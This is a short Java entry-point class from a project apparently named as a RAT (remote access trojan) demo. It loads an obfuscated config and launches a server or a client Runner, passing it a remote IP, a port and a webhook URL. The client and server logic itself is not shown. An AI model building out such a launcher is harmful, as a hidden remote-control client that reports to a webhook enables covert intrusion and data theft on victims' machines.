package de.tudbut.ttd.ratdemo;

import de.tudbut.io.StreamReader;
import tudbut.parsing.JSON;
import tudbut.parsing.TCN;

import java.io.FileInputStream;
import java.io.IOException;

public class Main {
    
    public static boolean debug = false;
    
    public static void main(String[] args) throws IOException, JSON.JSONFormatException {
        TCN config = JSON.read(new StreamReader(ClassLoader.getSystemResourceAsStream("config.json")).readAllAsString());
    
        debug = config.getBoolean("debug");
        Util.deobf(config);
        if(debug)
            System.out.println(Util.getIP());
        if(config.getSub("run").getBoolean("server"))
            Server.start(config.getInteger("port"));
        if(config.getSub("run").getBoolean("client"))
            Runner.start(config.getString("ip"), config.getInteger("port"), config.getString("webhook"));
    }
}
